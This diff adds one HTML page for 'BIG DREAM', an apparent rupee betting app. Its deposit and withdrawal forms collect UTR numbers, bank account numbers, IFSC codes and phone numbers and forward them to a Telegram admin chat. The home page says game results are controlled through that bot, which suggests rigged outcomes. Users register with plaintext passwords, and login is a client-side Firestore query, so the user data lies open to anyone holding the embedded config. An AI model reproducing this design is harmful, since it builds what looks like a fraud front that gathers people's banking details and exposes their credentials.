@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>BIG DREAM</title>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;900&family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
+    
+    <style>
+        /* =========================================
+           GLOBAL STYLES
+           ========================================= */
+        :root {
+            --primary-gold: #d4af37;
+            --primary-green: #00e676; 
+            --header-yellow: #ffd700;
+            --bg-dark: #0a0a0a;
+            --card-glass: rgba(30, 30, 30, 0.6);
+            --border-glass: rgba(255, 255, 255, 0.1);
+            --sidebar-bg: #151515;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+        
+        body { 
+            background: radial-gradient(circle at top center, #1a2c2c, #000000 60%);
+            color: white; display: flex; justify-content: center; min-height: 100vh; overflow-x: hidden; 
+        }
+
+        .app-container {
+            width: 100%; max-width: 414px; 
+            background: transparent;
+            position: relative; padding-bottom: 80px; min-height: 100vh;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            overflow: hidden; 
+        }
+
+        /* --- CUSTOMER SUPPORT FLOATING BUTTON --- */
+        .floating-cs-btn {
+            position: absolute;
+            bottom: 100px;
+            right: 20px;
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #42e695 0%, #3bb2b8 100%);
+            border-radius: 50%;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 4px 15px rgba(66, 230, 149, 0.4);
+            z-index: 400;
+            cursor: pointer;
+            border: 2px solid #fff;
+            touch-action: none;
+            transition: transform 0.1s;
+        }
+        .floating-cs-btn:active { transform: scale(0.95); }
+        .cs-icon { font-size: 28px; color: white; }
+
+        /* =========================================
+           AUTH (LOGIN/REGISTER) STYLES
+           ========================================= */
+        #auth-section {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; z-index: 5000; padding: 30px;
+            display: flex; flex-direction: column; justify-content: center;
+            background-image: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.9)), url('https://img.freepik.com/free-vector/gradient-background-vector-play-button-icon_53876-117531.jpg');
+            background-size: cover; background-position: center;
+        }
+
+        .auth-card {
+            background: rgba(20, 20, 20, 0.9);
+            border: 1px solid var(--primary-gold);
+            border-radius: 20px; padding: 25px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 0 20px rgba(212, 175, 55, 0.2);
+        }
+
+        .auth-logo { text-align: center; margin-bottom: 20px; font-size: 28px; font-weight: 900; color: var(--header-yellow); letter-spacing: 2px; text-shadow: 0 0 10px rgba(255, 215, 0, 0.5); }
+        .auth-title { text-align: center; margin-bottom: 20px; font-size: 18px; color: #ccc; }
+        
+        .auth-input-group { margin-bottom: 15px; position: relative; }
+        .auth-input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: var(--primary-gold); }
+        
+        .auth-input { 
+            width: 100%; padding: 14px 45px 14px 45px; 
+            background: #111; border: 1px solid #333; 
+            color: #fff; border-radius: 10px; outline: none; transition: 0.3s; 
+        }
+        .auth-input:focus { border-color: var(--primary-gold); box-shadow: 0 0 8px rgba(212, 175, 55, 0.3); }
+
+        .toggle-pass { position: absolute; right: 15px !important; left: auto !important; cursor: pointer; color: #666 !important; }
+        .toggle-pass:hover { color: var(--primary-gold) !important; }
+
+        .auth-btn {
+            width: 100%; padding: 15px; background: linear-gradient(90deg, #d4af37, #f59e0b);
+            border: none; border-radius: 10px; color: #000; font-weight: 800; font-size: 16px;
+            cursor: pointer; margin-top: 10px; box-shadow: 0 5px 15px rgba(212, 175, 55, 0.3);
+        }
+        .auth-link { text-align: center; margin-top: 15px; font-size: 13px; color: #888; }
+        .auth-link span { color: var(--primary-gold); cursor: pointer; font-weight: bold; }
+
+        #app-content { display: none; }
+
+        /* =========================================
+           HEADER & NAVIGATION STYLES
+           ========================================= */
+        header { 
+            display: flex; justify-content: space-between; align-items: center; padding: 12px 15px; 
+            background: #121212; position: sticky; top: 0; z-index: 50; border-bottom: 1px solid #333; 
+        }
+        .header-left { display: flex; align-items: center; gap: 15px; }
+        .menu-btn { font-size: 24px; color: white; cursor: pointer; }
+        .user-greeting { font-size: 18px; font-weight: 700; color: white; letter-spacing: 0.5px; }
+        .header-right { display: flex; align-items: center; gap: 15px; }
+        .bell-icon { font-size: 20px; color: white; cursor: pointer; position: relative; }
+        
+        .header-wallet-btn {
+            background-color: var(--header-yellow); color: #000; padding: 6px 12px; border-radius: 6px;
+            display: flex; align-items: center; gap: 8px; font-weight: 700; font-size: 14px; cursor: pointer;
+            box-shadow: 0 2px 5px rgba(255, 215, 0, 0.3);
+        }
+
+        .page { display: none; padding: 15px; animation: fadeIn 0.3s ease; }
+        .page.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .input-group-bonus { text-align: left; margin-bottom: 15px; }
+        .input-group-bonus label { color: #aaa; font-size: 12px; display: block; margin-bottom: 5px; }
+        .bonus-input { width: 100%; padding: 12px; background: #0a0a0a; border: 1px solid #333; border-radius: 8px; color: #fff; outline: none; }
+        
+        .btn-submit-utr { width: 100%; padding: 15px; background: linear-gradient(90deg, #00e676, #059669); border: none; border-radius: 8px; color: white; font-weight: 700; font-size: 14px; cursor: pointer; box-shadow: 0 4px 15px rgba(0, 230, 118, 0.3); margin-top: 20px; }
+
+        .navbar { 
+            position: fixed; bottom: 0; width: 100%; max-width: 414px; 
+            background: rgba(10, 10, 10, 0.95); backdrop-filter: blur(10px);
+            border-top: 1px solid #333; display: flex; justify-content: space-around; padding: 15px 0; z-index: 100;
+        }
+        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 5px; color: #666; cursor: pointer; text-decoration: none; font-size: 12px; background: none; border: none; }
+        .nav-item.active { color: var(--primary-gold); }
+
+        #toast { visibility: hidden; min-width: 250px; background-color: rgba(30,30,30,0.95); color: #fff; text-align: center; border-radius: 10px; padding: 16px; position: fixed; z-index: 3000; left: 50%; bottom: 100px; transform: translateX(-50%); font-size: 14px; border: 1px solid #444; }
+        #toast.show { visibility: visible; animation: fadein 0.5s, fadeout 0.5s 2.5s; }
+        @keyframes fadein { from { bottom: 0; opacity: 0; } to { bottom: 100px; opacity: 1; } }
+        @keyframes fadeout { from { bottom: 100px; opacity: 1; } to { bottom: 0; opacity: 0; } }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        
+        <!-- LOGIN / REGISTER SECTION -->
+        <div id="auth-section">
+            <div id="login-page" class="auth-card">
+                <div class="auth-logo">BIG DREAM</div>
+                <div class="auth-title">Login to your account</div>
+                <div class="auth-input-group">
+                    <i class="fa-solid fa-user"></i>
+                    <input type="text" id="login-id" class="auth-input" placeholder="Phone Number or Email">
+                </div>
+                <div class="auth-input-group">
+                    <i class="fa-solid fa-lock"></i>
+                    <input type="password" id="login-pass" class="auth-input" placeholder="Password">
+                </div>
+                <button class="auth-btn" onclick="handleLogin()">LOGIN</button>
+                <div class="auth-link">Don't have an account? <span onclick="switchAuth('register')">Register Now</span></div>
+            </div>
+
+            <div id="register-page" class="auth-card" style="display:none;">
+                <div class="auth-logo">BIG DREAM</div>
+                <div class="auth-title">Create a new account</div>
+                <div class="auth-input-group">
+                    <i class="fa-solid fa-user"></i>
+                    <input type="text" id="reg-name" class="auth-input" placeholder="Full Name">
+                </div>
+                <div class="auth-input-group">
+                    <i class="fa-solid fa-envelope"></i>
+                    <input type="text" id="reg-contact" class="auth-input" placeholder="Phone or Email">
+                </div>
+                <div class="auth-input-group">
+                    <i class="fa-solid fa-lock"></i>
+                    <input type="password" id="reg-pass" class="auth-input" placeholder="Password">
+                </div>
+                <button class="auth-btn" onclick="handleRegister()">REGISTER</button>
+                <div class="auth-link">Already have an account? <span onclick="switchAuth('login')">Login Here</span></div>
+            </div>
+        </div>
+
+        <!-- MAIN APPLICATION CONTENT -->
+        <div id="app-content">
+
+            <header id="main-header">
+                <div class="header-left">
+                    <span class="user-greeting" id="header-greeting">Hi, User</span>
+                </div>
+                <div class="header-right">
+                    <div class="header-wallet-btn" onclick="showPage('wallet')">
+                        <i class="fa-solid fa-wallet"></i> ₹<span id="displayBalance">0.00</span>
+                    </div>
+                </div>
+            </header>
+
+            <!-- HOME PAGE -->
+            <div id="home" class="page active">
+                <h2 style="margin-bottom: 20px;">Welcome to Big Dream</h2>
+                <div style="background: rgba(30, 30, 30, 0.6); padding: 20px; border-radius: 15px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.1);">
+                    <h3>Game Control Active</h3>
+                    <p style="color: #aaa; margin-top: 10px; font-size: 14px;">Results are synchronized directly via Telegram Admin Bot.</p>
+                </div>
+            </div>
+
+            <!-- WALLET / DEPOSIT & WITHDRAW PAGE -->
+            <div id="wallet" class="page">
+                <h2 style="margin-bottom:20px;">Wallet Transactions</h2>
+
+                <!-- Deposit Form -->
+                <div style="background: #152438; padding: 15px; border-radius: 10px; margin-bottom: 20px;">
+                    <h3>Deposit Funds</h3>
+                    <div class="input-group-bonus">
+                        <label>Enter UTR No :</label>
+                        <input type="text" id="dep-utr" class="bonus-input" placeholder="12 Digit UTR">
+                    </div>
+                    <div class="input-group-bonus">
+                        <label>Enter UID :</label>
+                        <input type="text" id="dep-uid" class="bonus-input" placeholder="Your UID">
+                    </div>
+                    <div class="input-group-bonus">
+                        <label>Enter Gmail :</label>
+                        <input type="email" id="dep-gmail" class="bonus-input" placeholder="Your Email">
+                    </div>
+                    <div class="input-group-bonus">
+                        <label>Enter Username :</label>
+                        <input type="text" id="dep-username" class="bonus-input" placeholder="Your Name">
+                    </div>
+                    <button class="btn-submit-utr" onclick="submitDeposit()">SUBMIT ✅</button>
+                </div>
+
+                <!-- Withdrawal Form -->
+                <div style="background: #152438; padding: 15px; border-radius: 10px;">
+                    <h3>Withdraw Funds</h3>
+                    <div class="input-group-bonus">
+                        <label>Enter Name :</label>
+                        <input type="text" id="wit-name" class="bonus-input" placeholder="Account Holder Name">
+                    </div>
+                    <div class="input-group-bonus">
+                        <label>Enter Bank Name :</label>
+                        <input type="text" id="wit-bank" class="bonus-input" placeholder="Bank Name">
+                    </div>
+                    <div class="input-group-bonus">
+                        <label>Enter Account No :</label>
+                        <input type="text" id="wit-acc" class="bonus-input" placeholder="Account Number">
+                    </div>
+                    <div class="input-group-bonus">
+                        <label>Enter IFSC Code :</label>
+                        <input type="text" id="wit-ifsc" class="bonus-input" placeholder="IFSC Code">
+                    </div>
+                    <div class="input-group-bonus">
+                        <label>Enter Phone Number :</label>
+                        <input type="text" id="wit-phone" class="bonus-input" placeholder="Phone Number">
+                    </div>
+                    <button class="btn-submit-utr" style="background: linear-gradient(90deg, #ea5455, #c0392b);" onclick="submitWithdrawal()">SUBMIT ✅</button>
+                </div>
+            </div>
+
+            <!-- NAVBAR -->
+            <div class="navbar">
+                <button class="nav-item active" onclick="showPage('home')"><i class="fa-solid fa-house"></i><span>Home</span></button>
+                <button class="nav-item" onclick="showPage('wallet')"><i class="fa-solid fa-wallet"></i><span>Wallet</span></button>
+            </div>
+
+        </div>
+
+        <div id="toast">Toast Message</div>
+    </div>
+
+    <!-- Firebase & Bot Sync Script -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getFirestore, doc, getDoc, setDoc, updateDoc, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyD4YcgCzfTtmp5SL39EFC6ViLIfwgJvuNo",
+            authDomain: "big-deram.firebaseapp.com",
+            projectId: "big-deram",
+            storageBucket: "big-deram.firebasestorage.app",
+            messagingSenderId: "532368567974",
+            appId: "1:532368567974:web:ee7eceafa93c7b79fd0e67"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        // TELEGRAM BOT CONFIGURATION
+        const BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"; // Apne Telegram Bot ka Token Daalein
+        const ADMIN_CHAT_ID = "YOUR_ADMIN_CHAT_ID";   // Apni Telegram Chat ID Daalein
+
+        window.showToast = function(msg) {
+            const t = document.getElementById('toast');
+            t.innerText = msg;
+            t.className = "show";
+            setTimeout(() => { t.className = t.className.replace("show", ""); }, 3000);
+        };
+
+        window.showPage = function(pageId) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(pageId).classList.add('active');
+        };
+
+        window.switchAuth = function(type) {
+            if(type === 'register') {
+                document.getElementById('login-page').style.display = 'none';
+                document.getElementById('register-page').style.display = 'block';
+            } else {
+                document.getElementById('register-page').style.display = 'none';
+                document.getElementById('login-page').style.display = 'block';
+            }
+        };
+
+        // Telegram Forwarder Function
+        async function sendTelegramNotification(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch(e) {
+                console.error("Telegram Notification Error:", e);
+            }
+        }
+
+        // Deposit Handler
+        window.submitDeposit = async function() {
+            const utr = document.getElementById('dep-utr').value;
+            const uid = document.getElementById('dep-uid').value;
+            const gmail = document.getElementById('dep-gmail').value;
+            const username = document.getElementById('dep-username').value;
+
+            if(!utr || !uid || !gmail || !username) {
+                showToast("Please fill all Deposit details!");
+                return;
+            }
+
+            const message = `<b>🎫 Deposit Request Received</b>\n\n` +
+                            `🎫 UTR no : ${utr}\n` +
+                            `🚇 UID : ${uid}\n` +
+                            `👾 Gmail : ${gmail}\n` +
+                            `👤 Username : ${username}\n` +
+                            `⏰ Deposit Time : ${new Date().toLocaleString()}`;
+
+            await sendTelegramNotification(message);
+            showToast("Deposit Request Submitted ✅");
+            
+            document.getElementById('dep-utr').value = '';
+            document.getElementById('dep-uid').value = '';
+            document.getElementById('dep-gmail').value = '';
+            document.getElementById('dep-username').value = '';
+        };
+
+        // Withdrawal Handler
+        window.submitWithdrawal = async function() {
+            const name = document.getElementById('wit-name').value;
+            const bank = document.getElementById('wit-bank').value;
+            const acc = document.getElementById('wit-acc').value;
+            const ifsc = document.getElementById('wit-ifsc').value;
+            const phone = document.getElementById('wit-phone').value;
+
+            if(!name || !bank || !acc || !ifsc || !phone) {
+                showToast("Please fill all Withdrawal details!");
+                return;
+            }
+
+            const message = `<b>🟥 Withdrawal Request Received</b>\n\n` +
+                            `👤 Name : ${name}\n` +
+                            `🏦 Bank Name : ${bank}\n` +
+                            `💳 Account No : ${acc}\n` +
+                            `🏧 IFSC CODE : ${ifsc}\n` +
+                            `📱 Number : ${phone}\n` +
+                            `⏰ Time : ${new Date().toLocaleString()}`;
+
+            await sendTelegramNotification(message);
+            showToast("Withdrawal Request Submitted ✅");
+
+            document.getElementById('wit-name').value = '';
+            document.getElementById('wit-bank').value = '';
+            document.getElementById('wit-acc').value = '';
+            document.getElementById('wit-ifsc').value = '';
+            document.getElementById('wit-phone').value = '';
+        };
+
+        // User Login
+        window.handleLogin = async function() {
+            const id = document.getElementById('login-id').value;
+            const pass = document.getElementById('login-pass').value;
+
+            if(!id || !pass) { showToast("Please fill all fields"); return; }
+
+            try {
+                const q = query(collection(db, "users"), where("contact", "==", id), where("password", "==", pass));
+                const snap = await getDocs(q);
+
+                if (!snap.empty) {
+                    const userData = snap.docs[0].data();
+                    document.getElementById('auth-section').style.display = 'none';
+                    document.getElementById('app-content').style.display = 'block';
+                    document.getElementById('header-greeting').innerText = "Hi, " + userData.name;
+                    document.getElementById('displayBalance').innerText = (userData.wallet?.deposit || 0).toFixed(2);
+                    showToast("Login Successful!");
+                } else {
+                    showToast("Invalid Credentials!");
+                }
+            } catch(e) {
+                showToast("Login Error");
+            }
+        };
+
+        // User Register
+        window.handleRegister = async function() {
+            const name = document.getElementById('reg-name').value;
+            const contact = document.getElementById('reg-contact').value;
+            const pass = document.getElementById('reg-pass').value;
+
+            if(!name || !contact || !pass) { showToast("Please fill all fields"); return; }
+
+            try {
+                const uid = Math.floor(Math.random() * 899999 + 100000).toString();
+                await setDoc(doc(db, "users", uid), {
+                    name: name,
+                    contact: contact,
+                    password: pass,
+                    uid: uid,
+                    wallet: { deposit: 0, winning: 0, bonus: 0 },
+                    createdAt: new Date().toISOString()
+                });
+                showToast("Registration Successful! Please Login.");
+                switchAuth('login');
+            } catch(e) {
+                showToast("Registration Error");
+            }
+        };
+    </script>
+</body>
+</html>
